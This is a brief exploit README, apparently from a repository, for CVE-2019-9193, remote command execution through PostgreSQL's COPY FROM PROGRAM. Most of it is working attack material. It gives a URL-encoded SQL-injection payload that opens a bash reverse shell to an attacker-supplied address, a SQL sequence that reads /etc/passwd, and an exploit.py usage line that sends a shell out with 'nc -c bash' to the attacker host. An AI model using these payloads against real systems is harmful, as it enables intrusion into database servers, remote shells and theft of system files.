# CVE-2019-9193

Inspiration from this blog post:
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authenticated-arbitrary-command-execution-on-postgresql-9-3/


working payload for SQLi:

```
DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'bash+-c+"bash+-i+>%26+/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT}+0>%261"'; SELECT cast(cmd_output as int) from cmd_exec
```



If you have direct access to the db, you can also do the above a command at a time:

```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'cat /etc/passwd';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

The exploit.py script does this.
You can use the script like so:

```
python3 exploit.py -i $RHOST -p 5437 -c 'nc -c bash ${ATTACKER_IP} ${ATTACKER_PORT}'
```
